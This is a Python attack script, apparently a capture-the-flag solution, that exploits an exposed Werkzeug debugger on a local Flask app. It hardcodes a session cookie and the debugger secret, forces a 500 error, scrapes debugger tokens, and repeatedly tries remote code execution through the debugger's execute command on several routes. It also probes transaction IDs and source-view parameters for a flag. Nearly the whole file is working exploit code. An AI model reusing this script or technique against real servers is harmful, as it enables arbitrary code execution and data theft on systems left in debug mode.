import requests
import re
import urllib.parse

BASE_URL = "http://127.0.0.1:5003"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"
SECRET = "YKhX0CLt5PHAxuDtcFOy"

def get_session():
    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE, domain="127.0.0.1", path="/")
    return session

def analyze_error_page():
    """Analyze the error page to find debugger components"""
    print("[*] Fetching error page analysis...")
    
    session = get_session()
    
    # Trigger the KeyError
    resp = session.post(
        f"{BASE_URL}/login",
        data={"wrong_field": "value"},
        allow_redirects=False,
        timeout=15
    )
    
    print(f"Status: {resp.status_code}")
    print(f"URL: {resp.url}")
    print(f"Length: {len(resp.text)}")
    
    if resp.status_code != 500:
        print("[-] Did not get 500 error as expected")
        return
    
    # Save full HTML for analysis
    html_content = resp.text
    
    # Look for specific debugger patterns
    patterns = {
        "traceback_id": r'tb=([0-9]+)',
        "console_url": r'console[^\"\'\s]+',
        "execute_url": r'cmd=execute[^\"\'\s]+',
        "secret": r'SECRET[^\"\'\s]+',
        "evalex": r'EVALEX[^;,\s]+'
    }
    
    results = {}
    
    for name, pattern in patterns.items():
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            results[name] = matches[:5]  # Store first 5 matches
            print(f"[+] Found {name}: {matches[:3]}")
        else:
            results[name] = []
    
    # Look for iframe sources (where console is embedded)
    iframe_matches = re.findall(r'<iframe[^>]*src=[\"\']([^\"\']+)[\"\']', html_content, re.IGNORECASE)
    if iframe_matches:
        print(f"[+] Found iframes: {iframe_matches}")
        results["iframes"] = iframe_matches
    
    # Look for script sources
    script_matches = re.findall(r'<script[^>]*src=[\"\']([^\"\']+)[\"\']', html_content, re.IGNORECASE)
    if script_matches:
        print(f"[+] Found script sources: {script_matches}")
        results["scripts"] = script_matches
    
    # Look for JavaScript variables
    js_vars = {}
    var_matches = re.findall(r'(\w+)\s*=\s*([\'\"][^\'\"]*[\'\"]|true|false|\d+)', html_content)
    for var_name, var_value in var_matches:
        if var_name in ['SECRET', 'EVALEX', 'CONSOLE_MODE', 'TRACEBACK']:
            js_vars[var_name] = var_value
    
    if js_vars:
        print(f"[+] JavaScript variables: {js_vars}")
        results["js_vars"] = js_vars
    
    # Print a section of the HTML around debugger references
    debugger_pos = html_content.find('__debugger__')
    if debugger_pos != -1:
        print(f"\n[+] Debugger context around position {debugger_pos}:")
        start = max(0, debugger_pos - 200)
        end = min(len(html_content), debugger_pos + 500)
        print(html_content[start:end])
    
    return results

def test_debugger_endpoints(traceback_info):
    """Test various debugger endpoint formats"""
    print("\n" + "=" * 60)
    print("TESTING DEBUGGER ENDPOINTS")
    print("=" * 60)
    
    session = get_session()
    
    # Base execute parameters
    base_params = {
        "__debugger__": "yes",
        "cmd": "execute",
        "s": SECRET,
        "code": "print(42)"
    }
    
    # Test different endpoint formats
    test_configs = [
        # On /login route (where error occurred)
        {"path": "/login", "params": {**base_params, "frm": "0"}},
        {"path": "/login", "params": {**base_params, "frm": "0", "t": "0"}},
        
        # On /console route
        {"path": "/console", "params": {**base_params, "frm": "0"}},
        {"path": "/console", "params": {**base_params, "frm": "0", "t": "0"}},
        
        # Try with tb parameter
        {"path": "/login", "params": {**base_params, "frm": "0", "tb": "0"}},
    ]
    
    for i, config in enumerate(test_configs):
        url = f"{BASE_URL}{config['path']}"
        params = config['params']
        
        print(f"\nTest {i+1}: {url}")
        print(f"Parameters: {params}")
        
        try:
            resp = session.get(url, params=params, timeout=15)
            print(f"Status: {resp.status_code}")
            print(f"Length: {len(resp.text)}")
            
            if resp.status_code == 200:
                # Check if it's actually executing or just returning page
                if '42' in resp.text:
                    print(f"[+] SUCCESS - Output contains '42'")
                    return url, params
                elif 'print(42)' in resp.text:
                    print(f"[-] Command not executed - code appears in response")
                elif 'Console' in resp.text:
                    print(f"[?] Got console page - check if execution works")
                else:
                    print(f"[?] Unexpected response (first 200 chars): {resp.text[:200]}")
            
        except Exception as e:
            print(f"Error: {e}")
    
    return None, None

def try_alternative_execution():
    """Try alternative execution methods"""
    print("\n" + "=" * 60)
    print("ALTERNATIVE EXECUTION METHODS")
    print("=" * 60)
    
    session = get_session()
    
    # Method 1: POST to /console
    print("\n[*] Method 1: POST to /console")
    
    post_data = {
        "__debugger__": "yes",
        "cmd": "execute",
        "frm": "0",
        "s": SECRET,
        "code": "print('post_test')"
    }
    
    resp = session.post(f"{BASE_URL}/console", data=post_data, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}")
    
    # Method 2: Use t parameter (traceback ID)
    print("\n[*] Method 2: Using traceback ID parameter")
    
    for tb_id in ["0", "1", "2"]:
        params = {
            "__debugger__": "yes",
            "cmd": "execute",
            "frm": "0",
            "t": tb_id,
            "s": SECRET,
            "code": "print('tb_test')"
        }
        
        resp = session.get(f"{BASE_URL}/console", params=params, timeout=15)
        print(f"tb={tb_id}: Status {resp.status_code}")
        
        if 'tb_test' in resp.text:
            print(f"[+] Execution output found with tb={tb_id}")
            return True
    
    # Method 3: Direct access to debugger execution
    print("\n[*] Method 3: Direct debugger execution")
    
    # Try accessing the debugger with different hosts/URLs
    execute_params = {
        "__debugger__": "yes",
        "cmd": "execute", 
        "frm": "0",
        "s": SECRET,
        "code": "print('direct_test')"
    }
    
    # Try on root
    resp = session.get(f"{BASE_URL}/", params=execute_params, timeout=15)
    print(f"On /: Status {resp.status_code}")
    
    # Try on /login
    resp = session.get(f"{BASE_URL}/login", params=execute_params, timeout=15)
    print(f"On /login: Status {resp.status_code}")
    
    return False

def direct_console_exploit():
    """Exploit based on direct console access (since /console returns 200)"""
    print("\n" + "=" * 60)
    print("DIRECT CONSOLE EXPLOITATION")
    print("=" * 60)
    
    session = get_session()
    
    # First get the console page
    print("[*] Accessing console page...")
    resp = session.get(f"{BASE_URL}/console")
    print(f"Status: {resp.status_code}")
    
    if resp.status_code != 200:
        print("[-] Cannot access console")
        return False
    
    # Look for any frame/execution context in the console page
    frame_matches = re.findall(r'frm=([0-9]+)', resp.text)
    if frame_matches:
        frame = frame_matches[0]
        print(f"[+] Found frame: {frame}")
    else:
        frame = "0"
        print(f"[-] No frame found, using default: {frame}")
    
    # Look for form or input mechanisms
    if '<form' in resp.text.lower():
        print("[+] Found form in console - analyzing...")
        
        # Look for form action
        form_action = re.search(r'<form[^>]*action=[\"\']([^\"\']*)[\"\']', resp.text, re.IGNORECASE)
        if form_action:
            action = form_action.group(1)
            print(f"[+] Form action: {action}")
    
    # Try to execute through console
    execute_params = {
        "s": SECRET,
        "frm": frame,
        "code": "print('console_direct_test')"
    }
    
    # Try GET
    resp = session.get(f"{BASE_URL}/console", params=execute_params, timeout=15)
    print(f"GET execute status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}")
    
    # Try POST
    resp = session.post(f"{BASE_URL}/console", data=execute_params, timeout=15)
    print(f"POST execute status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}")
    
    # Look for any successful execution indicators
    if 'console_direct_test' in resp.text:
        print("[+] Code execution confirmed!")
        return True
    
    return False

def search_application_files():
    """Try to find and read application source files"""
    print("\n" + "=" * 60)
    print("SEARCHING APPLICATION FILES FOR FLAG")
    print("=" * 60)
    
    session = get_session()
    
    # Known endpoints from our discovery
    endpoints = [
        "/console",
        "/login", 
        "/logout",
        "/transactions"
    ]
    
    # Try to get any accessible files
    for endpoint in endpoints:
        resp = session.get(f"{BASE_URL}{endpoint}")
        if resp.status_code == 200:
            print(f"\n[+] {endpoint} is accessible (length: {len(resp.text)})")
            
            # Search for flag in response
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"[!] FLAG FOUND at {endpoint}: {flag_match.group()}")
                return flag_match.group()
            
            # Try parameters
            if '?' not in endpoint:
                for param in ["debug=true", "show_source=true", "view=source"]:
                    test_url = f"{BASE_URL}{endpoint}?{param}"
                    test_resp = session.get(test_url)
                    if test_resp.status_code == 200 and len(test_resp.text) != len(resp.text):
                        print(f"[?] {test_url} returned different content")
                        flag_match = re.search(r'FLAG\{[^}]+\}', test_resp.text, re.IGNORECASE)
                        if flag_match:
                            print(f"[!] FLAG FOUND: {flag_match.group()}")
                            return flag_match.group()
    
    # Try to access /transactions with different IDs
    print("\n[*] Testing transactions with different IDs...")
    for i in range(1, 11):
        resp = session.get(f"{BASE_URL}/transactions?id={i}")
        if resp.status_code == 200:
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"[!] FLAG FOUND in transaction {i}: {flag_match.group()}")
                return flag_match.group()
    
    return None

def main():
    print("Werkzeug Debugger Analysis and Exploitation")
    print("=" * 60)
    print(f"Target: {BASE_URL}")
    print(f"Secret: {SECRET}")
    print()
    
    # Step 1: Analyze error page
    print("STEP 1: Analyzing error page...")
    traceback_info = analyze_error_page()
    
    # Step 2: Test various execution endpoints
    print("\nSTEP 2: Testing debugger endpoints...")
    working_url, working_params = test_debugger_endpoints(traceback_info)
    
    # Step 3: Try alternative methods
    if not working_url:
        print("\nSTEP 3: Trying alternative execution methods...")
        try_alternative_execution()
    
    # Step 4: Direct console exploitation
    print("\nSTEP 4: Direct console exploitation...")
    direct_console_exploit()
    
    # Step 5: Search application files
    print("\nSTEP 5: Searching application files...")
    flag = search_application_files()
    
    # Summary
    print("\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    
    if working_url:
        print(f"[+] Working execution endpoint: {working_url}")
        print(f"[+] Working parameters: {working_params}")
    else:
        print("[-] No working code execution found")
    
    if flag:
        print(f"[!] FLAG FOUND: {flag}")
    else:
        print("[-] Flag not found in application files")
    
    print(f"[+] Debugger console accessible at: {BASE_URL}/console")
    print(f"[+] Secret: {SECRET}")
    print(f"[+] EVALEX appears to be enabled based on SECRET being present")
    
    return flag

if __name__ == "__main__":
    flag = main()
    if flag:
        print(f"\n{'='*60}")
        print(f"SUCCESS: {flag}")
        print(f"{'='*60}")
